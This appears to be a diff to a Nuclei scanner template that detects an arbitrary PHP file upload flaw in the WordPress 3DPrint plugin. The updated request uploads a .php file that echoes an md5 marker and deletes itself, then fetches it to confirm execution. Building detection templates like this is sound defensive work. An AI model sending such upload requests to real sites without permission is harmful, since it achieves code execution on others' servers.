@@ -15,9 +15,12 @@ info:
     cvss-score: 8.8
     cwe-id: CWE-434
   metadata:
-    max-request: 2
     verified: true
+    max-request: 2
   tags: wpscan,edb,wordpress,wp,wp-plugin,fileupload,intrusive,3dprint
+
+variables:
+  string: "3dprint-arbitrary-file-upload"
 
 http:
   - raw:
@@ -35,18 +38,15 @@ http:
         Content-Disposition: form-data; name="file"; filename={{randstr}}.php
         Content-Type: text/php
 
-        <?php echo '3DPrint-arbitrary-file-upload'; ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         -----------------------------54331109111293931601238262353--
-
       - |
         GET /wp-content/uploads/p3d/{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
 
-    req-condition: true
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(header_2, "text/html")'
-          - "status_code_2 == 200"
-          - "contains(body_2, '3DPrint-arbitrary-file-upload')"
-        condition: and
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a0047304502210092014e2acf3401af56c104fd1cc045a38ee62d7793eecc5e0962c429f73fc1f002207e813d9d93e030d662ea9c28e935a97042af0cc1cdbc8374c67d6742cb7a8814:922c64590222798bb761d5b6d8e72950
